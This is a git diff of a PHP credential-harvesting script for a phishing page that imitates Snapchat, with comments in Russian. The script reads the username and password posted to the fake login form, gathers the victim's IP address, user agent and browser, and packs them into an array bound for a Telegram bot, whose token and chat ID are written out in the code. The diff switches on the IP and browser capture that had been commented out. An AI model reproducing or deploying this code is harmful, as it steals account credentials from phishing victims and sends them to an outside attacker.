@@ -4,12 +4,12 @@ ini_set('display_errors', '1');
 
 //IP Адресс
 
-// include 'ip.php';
+include 'ip.php';
 
 $username=$_POST['username'];
 $password=$_POST['password'];
 
-$service = "Snapchat"
+$service = "Snapchat";
 
 /* https://api.telegram.org/bot5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM/getUpdates,
 где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
@@ -18,9 +18,9 @@ $token = "5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM";
 $chat_id = "501357456";
 $arr = array(
   'Сервис: ' => $service,
-//   'IP адресс: ' => $ipaddress,
-//   'User Agent: ' => $useragent,
-//   'Браузер: ' => $browser, 
+  'IP адресс: ' => $ipaddress,
+  'User Agent: ' => $useragent,
+  'Браузер: ' => $browser, 
   'Имя пользователя: ' => $username,
   'Пароль: ' => $password
 );
